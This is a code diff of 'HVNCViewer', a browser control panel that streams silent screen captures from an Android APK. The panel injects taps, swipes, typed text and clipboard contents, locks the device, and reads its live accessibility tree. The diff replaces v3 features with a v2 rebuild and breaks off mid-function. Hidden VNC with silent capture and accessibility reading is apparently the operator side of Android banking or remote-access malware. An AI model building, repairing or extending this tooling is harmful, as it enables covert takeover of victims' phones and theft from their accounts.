@@ -1,30 +1,25 @@
 'use strict';
 /**
- * HVNCViewer v3 — [K] upgrade
+ * HVNCViewer v2 — [K] rebuild
  *
  * Pipeline (unchanged — GPU decode, zero-copy):
- *   WS binary → parse 49B header → WorkerPool createImageBitmap()
+ *   WS binary → parse 49B header → Worker createImageBitmap()
  *   → pendingBitmap → rAF ctx.drawImage (desynchronized)
  *
- * v3 additions over v2:
- *   • WorkerPool — dual-worker round-robin decode, one decoding while other is idle
- *   • Stall auto-reconnect — 2s poll, re-subscribes if no frame in 6s
- *   • Canvas recording — VP8 WebM via MediaRecorder, download on stop
- *   • Pan when zoomed — Shift+drag or middle-mouse drag; 1:1 resets zoom+pan
- *   • Ripple animations — TAP=blue, LONG_PRESS=amber, canvas-native
- *   • DPI-aware canvas — scales by devicePixelRatio (capped 2×)
- *   • Fullscreen button — requestFullscreen on root div
- *   • Shortcut legend — ? key or ? button toggles overlay grid
- *   • Hold-scroll — continuous SWIPE on drag, 80ms throttle
- *   • Quick app launch — ⚡ Launch prompts package + sends OPEN_APP
- *   • Better HUD — dropped-frame count in red, dropped shown when >0
+ * FIXES applied:
+ *   [Bug 4] mouseup swipe threshold: < 14 → < 0.03 (normalized).
+ *           Previous threshold was larger than the max possible hypot (√2≈1.41)
+ *           so SWIPE was never reachable from mouse drag.
+ *   [Bug 4] touchend swipe threshold: same fix applied.
+ *   [Bug 5] wheel scroll y2 offset: ±400 (pixel-scale) → ±0.25 (normalized + clamped).
+ *           Previous value produced coords like -399.5 which the APK rejected.
  *
- * v2 fixes preserved:
- *   [Bug 4] SWIPE threshold: 14 → 0.03 (normalized)
- *   [Bug 5] scroll delta: ±400px → ±0.25 normalized
+ * ADDITIONS:
+ *   ↺ VNC Restart button — sends FORCE_RESTART_VNC to APK then restarts stream subscription
+ *   🔄 Refresh button — soft restart: stop() + start() without APK-side restart
  */
 
-// ── WorkerPool ─────────────────────────────────────────────────────────────────
+// ── Inline DecodeWorker ────────────────────────────────────────────────────────
 const _WORKER_SRC = `
 self.onmessage = async ({ data: { seq, buf } }) => {
   try {
@@ -37,18 +32,24 @@ self.onmessage = async ({ data: { seq, buf } }) => {
 };
 `;
 
-class WorkerPool {
-  constructor(size = 2) {
-    const url = URL.createObjectURL(new Blob([_WORKER_SRC], { type: 'application/javascript' }));
-    this._workers = Array.from({ length: size }, () => new Worker(url));
-    this._rr      = 0;
-    URL.revokeObjectURL(url);
+let _worker    = null;
+let _workerRef = 0;
+
+function acquireWorker() {
+  if (!_worker) {
+    const blob = new Blob([_WORKER_SRC], { type: 'application/javascript' });
+    _worker = new Worker(URL.createObjectURL(blob));
   }
-  set onmessage(fn) { this._workers.forEach(w => (w.onmessage = fn)); }
-  postMessage(data, transfer) {
-    this._workers[this._rr++ % this._workers.length].postMessage(data, transfer);
+  _workerRef++;
+  return _worker;
+}
+
+function releaseWorker() {
+  if (--_workerRef <= 0 && _worker) {
+    _worker.terminate();
+    _worker    = null;
+    _workerRef = 0;
   }
-  terminate() { this._workers.forEach(w => w.terminate()); }
 }
 
 // ── FPS sparkline ──────────────────────────────────────────────────────────────
@@ -60,29 +61,25 @@ class FpsSparkline {
   }
   push(fps) { this.history.shift(); this.history.push(Math.min(fps, this.maxFps)); }
   setLatency(ms) { this._lat = ms; }
-  draw(ctx, x, y, dpr = 1, dropped = 0) {
+  draw(ctx, x, y) {
     const { w, h, history, maxFps } = this;
     ctx.save();
-    ctx.fillStyle = 'rgba(0,0,0,0.65)';
-    ctx.fillRect(x, y, (w + 72) * dpr, (h + 10) * dpr);
+    ctx.fillStyle = 'rgba(0,0,0,0.62)';
+    ctx.fillRect(x, y, w + 60, h + 8);
     for (let i = 0; i < w; i++) {
       const v  = history[i];
-      const bh = Math.round((v / maxFps) * h * dpr);
+      const bh = Math.round((v / maxFps) * h);
       ctx.fillStyle = `hsl(${120 * (v / maxFps)},80%,48%)`;
-      ctx.fillRect(x + i * dpr, y + (h + 4) * dpr - bh, dpr, bh);
+      ctx.fillRect(x + i, y + h - bh + 4, 1, bh);
     }
     const cur = history[w - 1];
     const lat = this._lat;
-    ctx.font      = `bold ${11 * dpr}px monospace`;
+    ctx.font      = 'bold 11px monospace';
     ctx.fillStyle = cur >= 10 ? '#3dba7a' : cur >= 4 ? '#e0b84a' : '#e05c5c';
-    ctx.fillText(`${cur.toFixed(1)} FPS`, x + (w + 3) * dpr, y + 12 * dpr);
-    ctx.font      = `${9 * dpr}px monospace`;
+    ctx.fillText(`${cur.toFixed(1)} FPS`, x + w + 3, y + 12);
+    ctx.font      = '9px monospace';
     ctx.fillStyle = '#6666aa';
-    ctx.fillText(lat >= 0 ? `${lat}ms` : '---', x + (w + 3) * dpr, y + 23 * dpr);
-    if (dropped > 0) {
-      ctx.fillStyle = '#e05c5c';
-      ctx.fillText(`↓${dropped}`, x + (w + 3) * dpr, y + 34 * dpr);
-    }
+    ctx.fillText(lat >= 0 ? `${lat}ms` : '---', x + w + 3, y + 24);
     ctx.restore();
   }
 }
@@ -92,7 +89,7 @@ class HVNCViewer {
   /**
    * @param {HTMLElement} container
    * @param {string}      deviceId
-   * @param {Function}    sendFn   — sendJson(obj)
+   * @param {Function}    sendFn    — ws.sendJson(obj)
    * @param {{ frameW, frameH, screenW, screenH }} opts
    */
   constructor(container, deviceId, sendFn, opts = {}) {
@@ -106,16 +103,10 @@ class HVNCViewer {
     this.screenH = opts.screenH ?? 1920;
 
     this._zoom    = 1.0;
-    this._panX    = 0;
-    this._panY    = 0;
-    this._panning = false;
-    this._panOrigin    = null;
-    this._panOriginPan = null;
-
     this._quality = 50;
-    this._mode    = 'vnc';
+    this._mode    = 'vnc';   // 'vnc' | 'v2' | 'duplo' | 'radar'
     this._running = false;
-    this._lyReader = null;
+    this._lyReader = null;  // LyReader instance (RADAR mode)
 
     this._buildUI();
 
@@ -126,33 +117,21 @@ class HVNCViewer {
     this._rafId     = null;
 
     // Metrics
-    this._times       = [];
-    this._latencies   = [];
-    this._dropped     = 0;
-    this._sparkline   = new FpsSparkline(80, 22, 30);
-    this._sparkTimer  = setInterval(() => this._sparkline.push(this.fps), 1000);
+    this._times     = [];
+    this._latencies = [];
+    this._dropped   = 0;
+    this._sparkline = new FpsSparkline(80, 22, 30);
+    this._sparkTimer = setInterval(() => this._sparkline.push(this.fps), 1000);
     this._showOverlay = true;
-
-    // Ripples
-    this._ripples = [];
-
-    // Stall detection
-    this._lastFrameTime = 0;
-    this._stallTimer    = null;
-
-    // Recording
-    this._recorder    = null;
-    this._recChunks   = [];
-    this._recActive   = false;
 
     // Quality adaptation
     this._stableLow  = 0;
     this._stableHigh = 0;
     this._qaTimer    = setInterval(() => this._adaptQuality(), 1000);
 
-    // Worker pool
-    this._pool = new WorkerPool(2);
-    this._pool.onmessage = ({ data: { seq, bmp } }) => {
+    // Worker
+    this._worker = acquireWorker();
+    this._worker.onmessage = ({ data: { seq, bmp } }) => {
       if (seq < this._latestSeq) { bmp.close(); this._dropped++; return; }
       this._latestSeq = seq;
       if (this._pending) { this._pending.close(); this._dropped++; }
@@ -160,8 +139,7 @@ class HVNCViewer {
     };
 
     // Input
-    this._mouse = { down: false, origin: null, t: 0, holdScrollFired: false,
-                    lastScrollPos: null, lastScrollTime: 0 };
+    this._mouse = { down: false, origin: null, t: 0 };
     this._pinch = { dist: 0, active: false };
     this._bindInput();
 
@@ -169,74 +147,24 @@ class HVNCViewer {
     this._drawPlaceholder();
   }
 
-  // ── UI build ───────────────────────────────────────────────────────────────
+  // ── UI ──────────────────────────────────────────────────────────────────────
   _buildUI() {
-    const dpr = Math.min(window.devicePixelRatio || 1, 2);
-    this._dpr = dpr;
-
     this.container.innerHTML = `
-    <div id="_hv_root" style="
-      display:flex;flex-direction:column;width:100%;height:100%;
-      background:#06060f;position:relative">
+    <div id="_hv_root" style="display:flex;flex-direction:column;width:100%;height:100%;background:#06060f">
 
-      <!-- SHORTCUT LEGEND OVERLAY -->
-      <div id="_hv_shortcuts" style="
-        display:none;position:absolute;inset:0;background:rgba(6,6,15,0.94);
-        z-index:200;overflow-y:auto;padding:20px 24px;pointer-events:auto">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
-          <span style="font-size:14px;font-weight:700;color:#7c6af7">Keyboard Shortcuts</span>
-          <button id="_hv_scClose" style="
-            background:none;border:1px solid #2a2a50;color:#555;
-            border-radius:4px;padding:2px 10px;font-size:11px;cursor:pointer">✕ Close</button>
-        </div>
-        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:6px;font-size:11px">
-          ${[
-            ['Ctrl+H',     'HOME'],
-            ['Ctrl+B',     'BACK'],
-            ['Ctrl+R',     'RECENTS'],
-            ['Ctrl+V',     'Paste clipboard → TYPE'],
-            ['Ctrl+C',     'Lock device'],
-            ['Ctrl+S',     'Start stream'],
-            ['Ctrl+Q',     'Stop stream'],
-            ['Escape',     'BACK'],
-            ['F1',         'HOME'],
-            ['F2',         'RECENTS'],
-            ['F3',         'Quick Settings'],
-            ['F5',         'Restart VNC capture'],
-            ['Arrow keys', 'Scroll / swipe'],
-            ['Backspace',  'Delete char (TYPE \\b)'],
-            ['Enter',      'Newline (TYPE \\n)'],
-            ['Tab',        'Tab char'],
-            ['Delete',     'DEL char'],
-            ['Printable',  'TYPE character'],
-            ['?',          'Toggle this legend'],
-            ['Shift+drag', 'Pan canvas when zoomed'],
-            ['Middle-drag','Pan canvas when zoomed'],
-            ['Ctrl+scroll','Zoom in / out'],
-          ].map(([k, v]) => `
-            <div style="display:flex;gap:8px;align-items:center;
-              background:#0e0e1c;border:1px solid #1a1a2e;
-              border-radius:4px;padding:5px 8px">
-              <span style="font-family:monospace;color:#7c6af7;
-                min-width:90px;font-size:10px;flex-shrink:0">${k}</span>
-              <span style="color:#888">${v}</span>
-            </div>`).join('')}
-        </div>
-      </div>
-
-      <!-- TOP BAR -->
+      <!-- TOP BAR: controls -->
       <div id="_hv_topbar" style="
         display:flex;align-items:center;gap:8px;padding:6px 10px;
         background:#0e0e1c;border-bottom:1px solid #1a1a2e;flex-shrink:0;flex-wrap:wrap">
 
         <!-- Mode selector -->
         <div style="display:flex;border:1px solid #1e1e32;border-radius:6px;overflow:hidden">
-          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc">VNC</button>
-          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2">V2</button>
+          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc"  >VNC</button>
+          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2"   >V2</button>
           <button id="_hv_m_dpl"  class="_hvmode"        data-mode="duplo">DUPLO</button>
           <button id="_hv_m_rdr"  class="_hvmode"        data-mode="radar"
             style="border-left:1px solid #1e1e32;color:#3dba7a"
-            title="Ly Screen Reader — accessibility tree">Ly</button>
+            title="Ly Screen Reader — renders the live accessibility tree">Ly</button>
         </div>
 
         <!-- Start / Stop -->
@@ -261,33 +189,14 @@ class HVNCViewer {
 
         <!-- Zoom -->
         <span style="font-size:10px;color:#555">Z</span>
-        <input type="range" id="_hv_zoom" min="50" max="400" value="100" step="10"
+        <input type="range" id="_hv_zoom" min="50" max="300" value="100" step="10"
           style="width:70px;accent-color:#3dba7a">
         <span id="_hv_zl" style="font-size:10px;color:#3dba7a;width:34px">100%</span>
         <button id="_hv_zreset" style="
           background:none;border:1px solid #222244;color:#555;
-          border-radius:4px;padding:2px 6px;font-size:10px;cursor:pointer"
-          title="Reset zoom and pan">1:1</button>
+          border-radius:4px;padding:2px 6px;font-size:10px;cursor:pointer">1:1</button>
 
         <span style="flex:1"></span>
-
-        <!-- Recording -->
-        <button id="_hv_recbtn" style="
-          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
-          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
-          title="Record canvas as WebM">⏺ REC</button>
-
-        <!-- Fullscreen -->
-        <button id="_hv_fullscreen" style="
-          background:none;border:1px solid #222244;color:#444;
-          border-radius:4px;padding:2px 7px;font-size:12px;cursor:pointer"
-          title="Fullscreen">⛶</button>
-
-        <!-- Shortcut help -->
-        <button id="_hv_helpbtn" style="
-          background:none;border:1px solid #222244;color:#444;
-          border-radius:4px;padding:2px 7px;font-size:11px;cursor:pointer"
-          title="Keyboard shortcuts">?</button>
 
         <!-- Status chip -->
         <div id="_hv_status" style="
@@ -304,9 +213,9 @@ class HVNCViewer {
         background:#090915;border-bottom:1px solid #14142a;flex-shrink:0;flex-wrap:wrap">
 
         <!-- Navigation -->
-        <button class="_hvbtn" data-cmd="BACK"          title="Back">← Back</button>
-        <button class="_hvbtn" data-cmd="HOME"          title="Home">⌂ Home</button>
-        <button class="_hvbtn" data-cmd="RECENTS"       title="Recents">⧉ Recents</button>
+        <button class="_hvbtn" data-cmd="BACK"         title="Back">← Back</button>
+        <button class="_hvbtn" data-cmd="HOME"         title="Home">⌂ Home</button>
+        <button class="_hvbtn" data-cmd="RECENTS"      title="Recents">⧉ Recents</button>
         <button class="_hvbtn" data-cmd="NOTIFICATIONS" title="Notifications">🔔 Notifs</button>
         <button class="_hvbtn" data-cmd="QUICK_SETTINGS" title="Quick Settings">⚙ QS</button>
 
@@ -333,20 +242,16 @@ class HVNCViewer {
           background:#1a1a2e;border:1px solid #2a2a50;color:#888;
           border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Request hierarchy">🌳 Hier</button>
 
-        <!-- Quick App Launch -->
-        <button id="_hv_launchbtn" style="
-          background:#1a1a2e;border:1px solid #e0a84a;color:#e0a84a;
-          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
-          title="Open app by package name">⚡ Launch</button>
-
         <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>
 
         <!-- Stream controls -->
+        <!-- [ADDED] Restart VNC: tells APK to restart its capture engine, then re-subscribes -->
         <button id="_hv_restartbtn" style="
           background:#1a1a2e;border:1px solid #7c4af7;color:#7c4af7;
           border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
           title="Restart VNC capture on device + re-subscribe stream">↺ VNC Restart</button>
 
+        <!-- [ADDED] Refresh: soft restart of the stream subscription (no APK-side restart) -->
         <button id="_hv_refreshbtn" style="
           background:#1a1a2e;border:1px solid #3dba7a;color:#3dba7a;
           border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer"
@@ -364,59 +269,49 @@ class HVNCViewer {
           background:none;border:none;color:#333;font-size:10px;cursor:pointer">Overlay</button>
       </div>
 
-      <!-- CANVAS AREA -->
-      <div id="_hv_canvasrow" style="
-        flex:1;overflow:hidden;display:flex;align-items:stretch;
-        justify-content:center;background:#06060f">
-        <div id="_hv_mainwrap" style="
-          flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden">
+      <!-- CANVAS AREA (flex row for DUPLO) -->
+      <div id="_hv_canvasrow" style="flex:1;overflow:hidden;display:flex;align-items:stretch;justify-content:center;background:#06060f">
+        <!-- Primary canvas -->
+        <div style="flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden">
           <canvas id="_hv_cv" tabindex="0" style="
             max-width:100%;max-height:100%;object-fit:contain;
             cursor:crosshair;outline:none;user-select:none;touch-action:none;
             transform-origin:center center"></canvas>
         </div>
-        <div id="_hv_v2panel" style="
-          flex:1;display:none;align-items:center;justify-content:center;
-          overflow:hidden;border-left:1px solid #1a1a2e">
+        <!-- V2 canvas (DUPLO right side) -->
+        <div id="_hv_v2panel" style="flex:1;display:none;align-items:center;justify-content:center;overflow:hidden;border-left:1px solid #1a1a2e">
           <canvas id="_hv_cv2" tabindex="0" style="
             max-width:100%;max-height:100%;object-fit:contain;
             cursor:crosshair;outline:none;user-select:none;touch-action:none"></canvas>
         </div>
-        <div id="_hv_radarpanel" style="
-          flex:1;display:none;position:relative;overflow:hidden;
-          border-left:1px solid #1a1a2e"></div>
+        <!-- Ly RADAR screen reader panel -->
+        <div id="_hv_radarpanel" style="flex:1;display:none;position:relative;overflow:hidden;border-left:1px solid #1a1a2e"></div>
       </div>
     </div>
 
     <style>
       ._hvmode {
-        background:none;border:none;color:#444;padding:3px 10px;
-        font-size:11px;font-weight:700;cursor:pointer;transition:background .15s;
+        background: none; border: none; color: #444; padding: 3px 10px;
+        font-size: 11px; font-weight: 700; cursor: pointer; transition: background .15s;
       }
-      ._hvmode.active { background:#1e1e38;color:#7c6af7; }
-      ._hvmode:hover:not(.active) { background:#12121f;color:#666; }
+      ._hvmode.active { background: #1e1e38; color: #7c6af7; }
+      ._hvmode:hover:not(.active) { background: #12121f; color: #666; }
       ._hvbtn {
-        background:#0e0e1e;border:1px solid #1e1e32;color:#777;
-        border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;
-        transition:background .12s,color .12s,border-color .12s;
+        background: #0e0e1e; border: 1px solid #1e1e32; color: #777;
+        border-radius: 4px; padding: 2px 8px; font-size: 10px; cursor: pointer;
+        transition: background .12s, color .12s, border-color .12s;
       }
-      ._hvbtn:hover { background:#1a1a2e;color:#aaa;border-color:#2a2a50; }
-      ._hvbtn:active { background:#252540; }
+      ._hvbtn:hover { background: #1a1a2e; color: #aaa; border-color: #2a2a50; }
+      ._hvbtn:active { background: #252540; }
     </style>`;
 
+    // Elements
     this.canvas  = this.container.querySelector('#_hv_cv');
     this.canvas2 = this.container.querySelector('#_hv_cv2');
-
-    // DPI-aware canvas sizing
-    this.canvas.width   = this.frameW * dpr;
-    this.canvas.height  = this.frameH * dpr;
-    this.canvas.style.width  = this.frameW + 'px';
-    this.canvas.style.height = this.frameH + 'px';
-
-    this.canvas2.width  = this.frameW * dpr;
-    this.canvas2.height = this.frameH * dpr;
-    this.canvas2.style.width  = this.frameW + 'px';
-    this.canvas2.style.height = this.frameH + 'px';
+    this.canvas.width  = this.frameW;
+    this.canvas.height = this.frameH;
+    this.canvas2.width  = this.frameW;
+    this.canvas2.height = this.frameH;
 
     this.ctx  = this.canvas.getContext('2d',  { alpha: false, desynchronized: true });
     this.ctx2 = this.canvas2.getContext('2d', { alpha: false, desynchronized: true });
@@ -425,7 +320,6 @@ class HVNCViewer {
     this._bindToolbar();
   }
 
-  // ── Toolbar ────────────────────────────────────────────────────────────────
   _bindToolbar() {
     const c = this.container;
 
@@ -440,17 +334,20 @@ class HVNCViewer {
 
         const v2panel    = c.querySelector('#_hv_v2panel');
         const radarPanel = c.querySelector('#_hv_radarpanel');
-        const mainWrap   = c.querySelector('#_hv_mainwrap');
+        const mainCanvas = c.querySelector('#_hv_cv').parentElement;
 
+        // Reset panel visibility
         v2panel.style.display    = 'none';
         radarPanel.style.display = 'none';
-        mainWrap.style.display   = 'flex';
+        mainCanvas.style.display = 'flex';
 
         if (this._mode === 'duplo') {
           v2panel.style.display = 'flex';
         } else if (this._mode === 'radar') {
-          mainWrap.style.display   = 'none';
+          // Hide pixel stream canvas in radar mode, show reader panel
+          mainCanvas.style.display = 'none';
           radarPanel.style.display = 'block';
+          // Instantiate LyReader if not already
           if (!this._lyReader && typeof LyReader !== 'undefined') {
             this._lyReader = new LyReader(
               radarPanel, this.deviceId,
@@ -477,7 +374,7 @@ class HVNCViewer {
       if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
     });
 
-    // Zoom slider
+    // Zoom
     const zSl = c.querySelector('#_hv_zoom');
     const zLb = c.querySelector('#_hv_zl');
     zSl.addEventListener('input', () => {
@@ -485,15 +382,8 @@ class HVNCViewer {
       zLb.textContent = zSl.value + '%';
       this._applyZoom();
     });
-
-    // 1:1 — reset zoom AND pan
     c.querySelector('#_hv_zreset').addEventListener('click', () => {
-      this._zoom = 1;
-      this._panX = 0;
-      this._panY = 0;
-      if (zSl) zSl.value = 100;
-      if (zLb) zLb.textContent = '100%';
-      this._applyZoom();
+      this._zoom = 1; zSl.value = 100; zLb.textContent = '100%'; this._applyZoom();
     });
 
     // Gesture buttons
@@ -501,13 +391,13 @@ class HVNCViewer {
       btn.addEventListener('click', () => this._cmd(btn.dataset.cmd, {}));
     });
 
-    // Type
+    // Type button
     c.querySelector('#_hv_typebtn').addEventListener('click', () => {
       const text = prompt('Type text to inject:');
       if (text !== null && text.length > 0) this._cmd('TYPE', { text });
     });
 
-    // Paste
+    // Paste button
     c.querySelector('#_hv_pastebtn').addEventListener('click', () => {
       navigator.clipboard.readText().then(text => {
         if (text) {
@@ -516,35 +406,33 @@ class HVNCViewer {
         }
       }).catch(() => {
         const text = prompt('Paste text (clipboard denied):');
-        if (text) {
-          this._cmd('SET_CLIPBOARD', { text });
-          setTimeout(() => this._cmd('TYPE', { text }), 100);
-        }
+        if (text) { this._cmd('SET_CLIPBOARD', { text }); setTimeout(() => this._cmd('TYPE', { text }), 100); }
       });
     });
 
-    // Hierarchy
+    // Hierarchy button
     c.querySelector('#_hv_hierarchybtn').addEventListener('click', () => {
       this._cmd('REQUEST_HIERARCHY', {});
     });
 
-    // Quick app launch
-    c.querySelector('#_hv_launchbtn').addEventListener('click', () => {
-      const pkg = prompt('Package name (e.g. com.android.chrome):');
-      if (pkg && pkg.trim()) this._cmd('OPEN_APP', { package: pkg.trim() });
-    });
-
-    // VNC Restart
+    // [ADDED] VNC Restart button
+    // Sends FORCE_RESTART_VNC to the APK (restarts capture service on device),
+    // then after 600ms stops and restarts the stream subscription on our side.
     c.querySelector('#_hv_restartbtn').addEventListener('click', () => {
       this._cmd('FORCE_RESTART_VNC', {});
       const wasRunning = this._running;
       if (wasRunning) this.stop();
-      setTimeout(() => { if (wasRunning) this.start(); }, 600);
+      setTimeout(() => {
+        if (wasRunning) this.start();
+      }, 600);
     });
 
-    // Soft Refresh
+    // [ADDED] Refresh button
+    // Soft restart: stop() then start() without disturbing the APK capture engine.
+    // Use this when the stream freezes or subscription drops without device-side issues.
     c.querySelector('#_hv_refreshbtn').addEventListener('click', () => {
-      if (this._running) {
+      const wasRunning = this._running;
+      if (wasRunning) {
         this.stop();
         setTimeout(() => this.start(), 300);
       } else {
@@ -552,7 +440,7 @@ class HVNCViewer {
       }
     });
 
-    // Touch visibility
+    // Touch visibility toggle
     let touchVisible = false;
     const touchBtn = c.querySelector('#_hv_touchtoggle');
     touchBtn.addEventListener('click', () => {
@@ -565,104 +453,37 @@ class HVNCViewer {
 
     // Overlay toggle
     c.querySelector('#_hv_overlayToggle').addEventListener('click', () => this.toggleOverlay());
-
-    // Recording
-    const recBtn = c.querySelector('#_hv_recbtn');
-    recBtn.addEventListener('click', () => this._toggleRecording(recBtn));
-
-    // Fullscreen
-    c.querySelector('#_hv_fullscreen').addEventListener('click', () => {
-      const root = c.querySelector('#_hv_root');
-      if (root.requestFullscreen)       root.requestFullscreen();
-      else if (root.webkitRequestFullscreen) root.webkitRequestFullscreen();
-    });
-
-    // Shortcut legend
-    const helpBtn = c.querySelector('#_hv_helpbtn');
-    helpBtn.addEventListener('click', () => this._toggleShortcuts());
-    c.querySelector('#_hv_scClose').addEventListener('click', () => this._toggleShortcuts(false));
   }
 
-  // ── Recording ──────────────────────────────────────────────────────────────
-  _toggleRecording(btn) {
-    if (this._recActive) {
-      if (this._recorder) this._recorder.stop();
-      return;
-    }
-
-    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8')
-      ? 'video/webm;codecs=vp8' : 'video/webm';
-
-    let stream;
-    try {
-      stream = this.canvas.captureStream(20);
-    } catch {
-      alert('captureStream not supported in this browser.');
-      return;
-    }
-
-    this._recChunks = [];
-    this._recorder  = new MediaRecorder(stream, { mimeType });
-
-    this._recorder.ondataavailable = e => {
-      if (e.data && e.data.size > 0) this._recChunks.push(e.data);
-    };
-
-    this._recorder.onstop = () => {
-      const blob = new Blob(this._recChunks, { type: mimeType });
-      const a    = document.createElement('a');
-      a.href     = URL.createObjectURL(blob);
-      a.download = `hvnc_${this.deviceId.slice(0, 8)}_${Date.now()}.webm`;
-      a.click();
-      URL.revokeObjectURL(a.href);
-      this._recActive = false;
-      this._recorder  = null;
-      btn.textContent = '⏺ REC';
-      btn.style.color = '#888';
-      btn.style.borderColor = '#2a2a50';
-    };
-
-    this._recorder.start(500); // 500ms timeslice
-    this._recActive = true;
-    btn.textContent = '⏹ STOP REC';
-    btn.style.color = '#e05c5c';
-    btn.style.borderColor = '#e05c5c';
-  }
-
-  // ── Shortcut legend ────────────────────────────────────────────────────────
-  _toggleShortcuts(force) {
-    const el = this.container.querySelector('#_hv_shortcuts');
-    if (!el) return;
-    const show = force !== undefined ? force : el.style.display === 'none';
-    el.style.display = show ? 'block' : 'none';
-  }
-
-  // ── Zoom + Pan transform ───────────────────────────────────────────────────
   _applyZoom() {
-    this.canvas.style.transform =
-      `translate(${this._panX}px, ${this._panY}px) scale(${this._zoom})`;
+    this.canvas.style.transform = `scale(${this._zoom})`;
   }
 
-  // ── Start/Stop ─────────────────────────────────────────────────────────────
+  // ── Public: start streaming ────────────────────────────────────────────────
   start() {
     if (this._running) return;
     this._running = true;
-    this._lastFrameTime = Date.now();
     this._setStatus('LIVE', '#3dba7a');
-    this._startStallMonitor();
 
     switch (this._mode) {
       case 'vnc':
-        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
+        // Subscribe → hub sends: {action:'START_SILENT_VNC', enabled:true, quality:N}
+        this._sendOp({ type: 'vnc_subscribe', devId: this.deviceId, quality: this._quality });
         break;
+
       case 'v2':
+        // V2 = MediaProjection-based capture
         this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
         break;
+
       case 'duplo':
+        // DUPLO = both streams simultaneously
         this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
         this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
         break;
+
       case 'radar':
+        // Ly Screen Reader — continuous accessibility tree polling
         if (this._lyReader) {
           this._lyReader.startPolling(700);
         } else if (typeof LyReader !== 'undefined') {
@@ -676,49 +497,36 @@ class HVNCViewer {
             this._lyReader.startPolling(700);
           }
         } else {
+          // LyReader script not loaded — fire single shot
           this._send({ type: 'cmd', target: this.deviceId, cmd: 'REQUEST_HIERARCHY', args: {} });
         }
         break;
     }
   }
 
+  // ── Public: stop streaming ─────────────────────────────────────────────────
   stop() {
     if (!this._running) return;
     this._running = false;
-    this._stopStallMonitor();
     this._setStatus('IDLE', '#333356');
 
     switch (this._mode) {
       case 'vnc':
-        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId }); break;
+        this._sendOp({ type: 'vnc_unsubscribe', devId: this.deviceId });
+        break;
       case 'v2':
-        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId }); break;
+        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
+        break;
       case 'duplo':
         this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId });
         this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
         break;
       case 'radar':
-        if (this._lyReader) this._lyReader.stopPolling(); break;
+        if (this._lyReader) this._lyReader.stopPolling();
+        break;
     }
 
     this._drawPlaceholder();
-  }
-
-  // ── Stall monitor ──────────────────────────────────────────────────────────
-  _startStallMonitor() {
-    this._stopStallMonitor();
-    this._stallTimer = setInterval(() => {
-      if (!this._running) return;
-      if (Date.now() - this._lastFrameTime > 6000) {
-        this._setStatus('STALL→RECONNECT', '#e0a84a');
-        this.stop();
-        setTimeout(() => { if (!this._running) this.start(); }, 350);
-      }
-    }, 2000);
-  }
-
-  _stopStallMonitor() {
-    if (this._stallTimer) { clearInterval(this._stallTimer); this._stallTimer = null; }
   }
 
   _setStatus(label, color) {
@@ -726,9 +534,8 @@ class HVNCViewer {
     if (el) { el.textContent = label; el.style.color = color; el.style.borderColor = color + '55'; }
   }
 
-  // ── Receive frame ──────────────────────────────────────────────────────────
+  // ── Public: receive JPEG frame ─────────────────────────────────────────────
   onFrame(jpegBuf, serverTs, isV2 = false) {
-    this._lastFrameTime = Date.now();
     const seq = ++this._seq;
     const now = performance.now();
 
@@ -746,7 +553,8 @@ class HVNCViewer {
       }
     }
 
-    if (isV2 && (this._mode === 'duplo' || this._mode === 'v2')) {
+    if (isV2 && this._mode === 'duplo') {
+      // V2 frame → right canvas
       createImageBitmap(
         new Blob([jpegBuf], { type: 'image/jpeg' }),
         { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
@@ -757,8 +565,8 @@ class HVNCViewer {
       return;
     }
 
-    // Zero-copy transfer to pool
-    this._pool.postMessage({ seq, buf: jpegBuf }, [jpegBuf]);
+    // Zero-copy Transferable to Worker
+    this._worker.postMessage({ seq, buf: jpegBuf }, [jpegBuf]);
   }
 
   // ── Metrics ───────────────────────────────────────────────────────────────
@@ -775,89 +583,47 @@ class HVNCViewer {
   _startRenderLoop() {
     const tick = () => {
       this._rafId = requestAnimationFrame(tick);
-      if (this._pending) {
-        this.ctx.drawImage(this._pending, 0, 0, this.canvas.width, this.canvas.height);
-        this._pending.close();
-        this._pending = null;
-      }
+      if (!this._pending) return;
+      this.ctx.drawImage(this._pending, 0, 0, this.canvas.width, this.canvas.height);
+      this._pending.close();
+      this._pending = null;
       if (this._showOverlay) this._drawOverlay();
-      this._drawRipples();
     };
     this._rafId = requestAnimationFrame(tick);
   }
 
   _drawOverlay() {
-    const dpr = this._dpr;
-    this._sparkline.draw(this.ctx, 4 * dpr, 4 * dpr, dpr, this._dropped);
+    this._sparkline.draw(this.ctx, 4, 4);
     if (this._cursor) this._drawCursor();
-  }
-
-  // ── Ripple animations ──────────────────────────────────────────────────────
-  _spawnRipple(nx, ny, type) {
-    this._ripples.push({
-      x:    nx * this.canvas.width,
-      y:    ny * this.canvas.height,
-      t:    performance.now(),
-      type,
-    });
-  }
-
-  _drawRipples() {
